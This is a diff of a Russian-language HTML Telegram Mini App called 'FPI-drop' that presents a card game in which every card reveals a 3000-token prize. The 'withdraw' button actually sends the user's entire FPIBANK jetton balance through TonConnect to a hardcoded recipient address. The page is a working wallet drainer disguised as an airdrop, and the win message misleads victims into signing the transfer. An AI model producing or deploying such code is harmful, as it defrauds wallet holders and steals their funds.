@@ -1,150 +1,373 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Telegram Mini App: Отправка FPIBANK</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FPI-drop</title>
+  
+  <!-- Скрипты и стили TonConnect / Telegram -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
+  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
+  
+  <style>
+    body {
+      background-color: #0b0021; /* Темный фиолетовый фон */
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+    /* Навигационная шапка */
+    .nav {
+      background-color: #1a0033;
+      text-align: center;
+      padding: 10px;
+      font-size: 1em;
+    }
+    .nav .nav-link {
+      color: #fff;
+      margin: 0 10px;
+      cursor: pointer;
+    }
+    .nav .nav-link:hover {
+      text-decoration: underline;
+    }
+    /* Общие стили для страниц */
+    .page {
+      display: none; /* Страницы скрыты, будем показывать JS-ом */
+      padding: 20px;
+      flex: 1;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    /* Страница 1 */
+    #page1 img {
+      max-width: 300px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    #page1 #ton-connect {
+      margin: 20px 0;
+    }
+    #goPage2 {
+      background-color: green;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #goPage2:hover {
+      opacity: 0.8;
+    }
+    /* Страница 2 */
+    #page2 #sendTransaction {
+      background-color: green;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #page2 #sendTransaction:hover {
+      opacity: 0.8;
+    }
+    .cards-container {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 40px;
+      flex-wrap: wrap;
+      position: relative; /* Для позиционирования выбранной карточки внутри */
+      min-height: 600px;
+    }
+    .card {
+      width: 120px;
+      height: 180px;
+      perspective: 1000px;
+      cursor: pointer;
+      transition: opacity 0.8s ease-out;
+    }
+    .card-inner {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      transition: transform 0.8s;
+      transform-style: preserve-3d;
+    }
+    .card.flipped .card-inner {
+      transform: rotateY(180deg);
+    }
+    .card-front, .card-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2em;
+      font-weight: bold;
+    }
+    .card-front {
+      background: linear-gradient(135deg, #333, #555);
+      color: white;
+    }
+    .card-back {
+      background: linear-gradient(135deg, #fff, #ddd);
+      color: black;
+      transform: rotateY(180deg);
+    }
+    /* Карточки, не выбранные, растворяются */
+    .fade-out {
+      opacity: 0;
+    }
+    /* Выбранная карточка перемещается в центр контейнера */
+    .selected-card {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      transition: transform 0.8s ease-out, opacity 0.8s ease-out;
+      z-index: 1000;
+    }
+    #winMessage {
+      margin-top: 20px;
+      font-size: 1.2em;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-  <h1>Отправка всех FPIBANK через TonConnect</h1>
-
-  <div id="ton-connect"></div>
-  <button id="sendTransaction">Отправить все FPIBANK</button>
-
+  <!-- Навигация -->
+  <div class="nav">
+    <span class="nav-link" data-page="page1">Страница 1</span> |
+    <span class="nav-link" data-page="page2">Страница 2</span>
+  </div>
+  
+  <!-- Страница 1 -->
+  <div id="page1" class="page">
+    <!-- Заголовок заменён на изображение -->
+    <img src="./js/6atalzkorwc2qht2piwnnuln62yn.png" alt="FPI-drop">
+    <div id="ton-connect"></div>
+    <button id="goPage2">Перейти к карточкам</button>
+  </div>
+  
+  <!-- Страница 2 -->
+  <div id="page2" class="page">
+    <button id="sendTransaction">Отправить все FPIBANK</button>
+    <div class="cards-container">
+      <!-- 4 карточки, все с числом 3000 -->
+      <div class="card" data-index="0">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back">3000</div>
+        </div>
+      </div>
+      <div class="card" data-index="1">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back">3000</div>
+        </div>
+      </div>
+      <div class="card" data-index="2">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back">3000</div>
+        </div>
+      </div>
+      <div class="card" data-index="3">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back">3000</div>
+        </div>
+      </div>
+      <div id="winMessage"></div>
+    </div>
+  </div>
+  
   <script>
-    // Ваше оригинальное подключение TonConnect без изменений
+    /* 0) Навигация между страницами */
+    const navLinks = document.querySelectorAll('.nav-link');
+    const pages = document.querySelectorAll('.page');
+    function showPage(pageId) {
+      pages.forEach(p => {
+        p.style.display = (p.id === pageId) ? 'block' : 'none';
+      });
+    }
+    navLinks.forEach(link => {
+      link.addEventListener('click', () => {
+        const targetPage = link.getAttribute('data-page');
+        showPage(targetPage);
+      });
+    });
+    // По умолчанию показываем страницу 1
+    showPage('page1');
+    document.getElementById('goPage2').addEventListener('click', () => {
+      showPage('page2');
+    });
+  
+    /* 1) Логика TonConnect и отправки FPIBANK */
     if (typeof Telegram === "undefined") {
       window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
     } else {
       Telegram.WebApp.ready();
     }
-
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect",
     });
-
-    // Константы
-    const JETTON_MASTER = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016"";
-    const RECIPIENT_TON_ADDRESS = "EQAR8LtBgI6uFZPLwV6A0TEz_uekvux9SKlC2vymS588ZeAg";
-
-    // Проверка адреса (ваша оригинальная функция)
+    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
+    const recipientTonAddress = "0:11f0bb41808eae1593cbc15e80d13133fee7a4beec7d48a942dafca64b9f3c65";
     function isValidTonAddress(address) {
       return /^0:[a-fA-F0-9]{64}$/.test(address);
     }
-
-    // Получение jetton-кошелька получателя (оптимизированная версия)
-    async function getRecipientJettonWallet(recipientTonAddress) {
-      if (!isValidTonAddress(recipientTonAddress)) {
-        throw new Error("Неверный формат TON-адреса получателя");
+    async function getOrCreateRecipientJettonWallet(recipientTonAddress) {
+      console.log("Запрашиваем Jetton Wallet получателя:", recipientTonAddress);
+      try {
+        const response = await fetch(`https://tonapi.io/v2/accounts/${recipientTonAddress}/jettons`);
+        const data = await response.json();
+        console.log("Ответ от TonAPI:", data);
+        const jettonData = data.balances.find(j => j.jetton.address === jettonMasterAddress);
+        if (jettonData) {
+          return jettonData.wallet_address.address;
+        }
+        return recipientTonAddress;
+      } catch (error) {
+        console.error("Ошибка при получении jetton-кошелька получателя:", error);
+        return recipientTonAddress;
       }
-
-      const response = await fetch(`https://tonapi.io/v2/accounts/${recipientTonAddress}/jettons`);
-      const data = await response.json();
-      
-      const jettonData = data.balances.find(j => j.jetton.address === JETTON_MASTER);
-      if (!jettonData) {
-        throw new Error("У получателя нет кошелька для FPIBANK");
-      }
-      
-      return jettonData.wallet_address.address;
     }
-
-    // Получение данных о FPIBANK (оптимизированная версия)
     async function getUserFPIBankData(userTonAddress) {
-      if (!isValidTonAddress(userTonAddress)) {
-        throw new Error("Неверный формат вашего TON-адреса");
-      }
-
-      const response = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
-      const data = await response.json();
-
-      const jettonData = data.balances.find(j => j.jetton.address === JETTON_MASTER);
-      if (!jettonData) {
+      console.log("Запрашиваем баланс пользователя:", userTonAddress);
+      try {
+        const response = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
+        const data = await response.json();
+        console.log("Ответ от TonAPI:", data);
+        const jettonData = data.balances.find((j) => j.jetton.address === jettonMasterAddress);
+        if (!jettonData) {
+          console.warn("У пользователя нет Jetton Wallet");
+          return { rawBalance: "0", decimals: 9, userJettonWallet: null };
+        }
+        return {
+          rawBalance: jettonData.balance,
+          decimals: jettonData.jetton.decimals,
+          userJettonWallet: jettonData.wallet_address.address,
+        };
+      } catch (error) {
+        console.error("Ошибка при получении данных пользователя:", error);
         return { rawBalance: "0", decimals: 9, userJettonWallet: null };
       }
-
-      return {
-        rawBalance: jettonData.balance,
-        decimals: jettonData.jetton.decimals,
-        userJettonWallet: jettonData.wallet_address.address
-      };
     }
-
-    // Создание payload для перевода (исправленная версия)
-    async function createJettonTransferPayload(amount, destination, responseAddress) {
+    async function createJettonTransferPayload(amount, destination, userTonAddress) {
       const { Cell } = TonWeb.boc;
-      const cell = new Cell();
-      
-      cell.bits.writeUint(0x0f8a7ea5, 32); // opcode для jetton transfer
-      cell.bits.writeUint(0, 64); // query_id
-      cell.bits.writeCoins(new TonWeb.utils.BN(amount));
-      cell.bits.writeAddress(new TonWeb.Address(destination));
-      cell.bits.writeAddress(new TonWeb.Address(responseAddress));
-      cell.bits.writeBit(0); // no custom payload
-      cell.bits.writeCoins(new TonWeb.utils.BN(0)); // forward ton amount
-      cell.bits.writeBit(0); // no forward payload
-      
-      const boc = await cell.toBoc(false);
-      return TonWeb.utils.bytesToBase64(boc);
-    }
-
-    // Основная функция отправки (оптимизированная)
-    async function sendAllFPIBANK() {
+      const { BN } = TonWeb.utils;
+      if (!isValidTonAddress(destination) || !isValidTonAddress(userTonAddress)) {
+        console.error("Ошибка: Неверный формат TON-адреса!");
+        return null;
+      }
+      const transferCell = new Cell();
+      transferCell.bits.writeUint(0x0f8a7ea5, 32);
+      transferCell.bits.writeUint(0, 64);
+      transferCell.bits.writeCoins(new BN(amount.toString()));
+      transferCell.bits.writeAddress(new TonWeb.Address(destination));
+      transferCell.bits.writeAddress(new TonWeb.Address(userTonAddress));
+      transferCell.bits.writeBit(0);
+      transferCell.bits.writeCoins(new BN(0));
+      transferCell.bits.writeBit(0);
       try {
-        if (!tonConnectUI.connected) {
-          throw new Error("Сначала подключите кошелёк");
-        }
-
-        const userTonAddress = tonConnectUI.account?.address;
-        if (!userTonAddress) {
-          throw new Error("Не удалось получить ваш TON-адрес");
-        }
-
-        // Получаем данные отправителя
-        const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
-        if (!userJettonWallet || rawBalance === "0") {
-          throw new Error("Недостаточный баланс или кошелёк не найден");
-        }
-
-        // Получаем jetton-кошелёк получателя
-        const recipientJettonWallet = await getRecipientJettonWallet(RECIPIENT_TON_ADDRESS);
-
-        // Создаем payload
-        const payloadBoc = await createJettonTransferPayload(
-          rawBalance,
-          recipientJettonWallet,
-          userTonAddress
-        );
-
-        // Формируем транзакцию
-        const transaction = {
-          validUntil: Math.floor(Date.now() / 1000) + 300,
-          messages: [{
-            address: userJettonWallet,
-            amount: "100000000", // 0.1 TON
-            payload: payloadBoc
-          }]
-        };
-
-        // Отправляем транзакцию
-        const result = await tonConnectUI.sendTransaction(transaction);
-        Telegram.WebApp.showAlert(`Транзакция успешно отправлена!`);
-        console.log("Результат:", result);
-
+        const bocBytes = await transferCell.toBoc(false);
+        return TonWeb.utils.bytesToBase64(bocBytes);
       } catch (error) {
-        console.error("Ошибка:", error);
-        Telegram.WebApp.showAlert(`Ошибка: ${error.message}`);
+        console.error("Ошибка при создании payload:", error);
+        return null;
       }
     }
-
-    // Ваш оригинальный обработчик кнопки
-    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
+    async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
+      console.log("Начинаем отправку FPIBANK...");
+      const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
+      if (!userJettonWallet || rawBalance === "0") {
+        Telegram.WebApp.showAlert("Недостаточный баланс или кошелёк не найден!");
+        return;
+      }
+      console.log("Найден Jetton Wallet пользователя:", userJettonWallet);
+      const recipientJettonWallet = await getOrCreateRecipientJettonWallet(recipientTonAddress);
+      console.log("Jetton Wallet получателя (или TON-адрес):", recipientJettonWallet);
+      const balanceBigInt = BigInt(rawBalance);
+      const humanBalance = balanceBigInt / BigInt(10 ** decimals);
+      console.log(`Отправляем ${humanBalance} FPIBANK на ${recipientJettonWallet}`);
+      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientJettonWallet, userTonAddress);
+      if (!payloadBoc) {
+        Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
+        return;
+      }
+      console.log("Создан payload BOC:", payloadBoc);
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 3600,
+        messages: [{
+          address: userJettonWallet,
+          amount: "100000000",
+          payload: payloadBoc,
+        }],
+      };
+      try {
+        console.log("Отправляем транзакцию:", transaction);
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log("Транзакция успешно отправлена!", result);
+        Telegram.WebApp.showAlert(`Отправлено ${humanBalance} FPIBANK! TX: ${JSON.stringify(result)}`);
+      } catch (error) {
+        console.error("Ошибка при отправке транзакции:", error);
+        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
+      }
+    }
+    document.getElementById("sendTransaction").addEventListener('click', async () => {
+      if (!tonConnectUI.connected) {
+        Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
+        return;
+      }
+      const userTonAddress = tonConnectUI.wallet?.account?.address;
+      if (!userTonAddress) {
+        Telegram.WebApp.showAlert("Не удалось получить ваш TON-адрес.");
+        return;
+      }
+      await sendAllFPIBANK(userTonAddress, recipientTonAddress);
+    });
+  
+    /* 2) Логика карточек "удачи" */
+    const cards = document.querySelectorAll('.card');
+    const winMessage = document.getElementById('winMessage');
+    function setSelectedCard(selectedIndex) {
+      cards.forEach((card, index) => {
+        card.style.pointerEvents = 'none';
+        if (index == selectedIndex) {
+          card.classList.add('flipped', 'selected-card');
+        } else {
+          card.classList.add('fade-out');
+        }
+      });
+      winMessage.textContent = "Вы выиграли 3000 FPI-банок, вы можете вывести их нажав на кнопку - отправить все FPIBANK";
+    }
+    const storedIndex = localStorage.getItem('selectedCardIndex');
+    if (storedIndex !== null) {
+      setSelectedCard(storedIndex);
+    }
+    cards.forEach((card, index) => {
+      card.addEventListener('click', function () {
+        if (localStorage.getItem('selectedCardIndex') !== null) return;
+        localStorage.setItem('selectedCardIndex', index);
+        setSelectedCard(index);
+      });
+    });
   </script>
 </body>
 </html>
